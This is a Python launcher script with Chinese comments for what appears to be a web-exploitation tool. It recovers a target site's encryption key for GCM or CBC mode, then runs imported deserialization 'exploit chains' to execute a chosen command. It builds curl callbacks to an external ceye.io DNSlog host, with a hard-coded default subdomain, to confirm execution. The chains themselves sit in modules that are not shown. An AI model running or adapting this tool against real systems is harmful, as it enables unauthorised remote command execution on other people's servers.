import argparse
import sys
from core import Check
from core.Chains import takeChains


def banner():
    banner = '''
     /\__\     /\  \         /\__\         /\  \         /\  \    
    /:/  /     \:\  \       /:/  /        /::\  \       /::\  \   
   /:/  /       \:\  \     /:/__/        /:/\:\  \     /:/\ \  \  
  /:/  /         \:\  \   /::\__\____   /::\~\:\__\   _\:\~\ \  \ 
 /:/__/    _______\:\__\ /:/\:::::\__\ /:/\:\ \:|__| /\ \:\ \ \__|
 \:\  \    \::::::::/__/ \/_|:|~~|~    \:\~\:\/:/  / \:\ \:\ \/__/
  \:\  \    \:\~~\~~        |:|  |      \:\ \::/  /   \:\ \:\__\  
   \:\  \    \:\  \         |:|  |       \:\/:/  /     \:\/:/  /  
    \:\__\    \:\__\        |:|  |        \::/__/       \::/  /   
     \/__/     \/__/         \|__|         ~~            \/__/    
      
     /\__\    
    /:/  /    
   /:/__/     
  /::\  \ ___ 
 /:/\:\  /\__|   检测Key方法来源：https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21
 \/__\:\/:/  /   利用链来源：网上开源
      \::/  /    
      /:/  /  
     /:/  /   
     \/__/      
    '''
    print(banner)


if __name__ == '__main__':

    parsers = argparse.ArgumentParser(description="注释")
    parsers._optionals.title = "OPTIONS"
    parsers.add_argument('-T', '--Target', help="目标url", required=False)
    parsers.add_argument('-C', '--Encrypt', help='GCM或CBC算法', required=False)
    parsers.add_argument('-D', '--Ceye', help='输入ceye.io的url+token', required=False)
    parsers.add_argument('-Co', '--Command', help='输入命令操作', required=False)
    args = parsers.parse_args()
    banner()
    try:
     key = Check.getKey(args.Encrypt, args.Target)
     if key:
       print("加密key为："+str(key))
     else:
        print("无可用key")
        sys.exit()
     if args.Ceye:
         ceye = args.Ceye
     else:
         ceye = 'bihnty.ceye.io' #default dnslog
     ceye1 = "curl http://"+ceye.split("+")[0]+"/lzkbsh"
     ceye2 = "curl http://api.ceye.io/v1/records?token="+ceye.split("+")[1]+"&type=http"
     if args.Command:
         takeChains(key, args.Target, args.Encrypt, ceye, args.Command)
     else:
         takeChains(key, args.Target, args.Encrypt, ceye)
    except:
      print("你这网站有问题啊")

    a = input("是否要输入：")
